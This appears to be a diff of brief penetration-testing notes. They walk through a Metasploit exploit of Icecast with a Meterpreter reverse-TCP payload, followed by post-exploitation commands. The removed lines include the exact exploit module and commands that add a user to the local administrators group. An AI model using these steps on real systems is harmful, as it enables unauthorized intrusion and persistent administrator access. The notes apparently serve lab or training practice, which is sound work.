@@ -5,19 +5,19 @@
 
 	smfconsole  
 	search icecast  
-	use exploit/windows/http/icecast_header  
+	use exploit/xx 
 	set payload windows/meterpreter/reverse_tcp  
-	set rhost  
-	set lhost  
+	set rhost  xx
+	set lhost  xx
 	
 	sysinfo  
 	getuid  
 	ps  
 	
 	shell
-	net user <user> passwors /add
-	net localgroup administrators <user> /add
-	# voir : net localgroup administrators
+	#add user
+	#add user on admin group 
+	net localgroup administrators
 	
 	screenshot -p /tmp/screen/jpg
 	
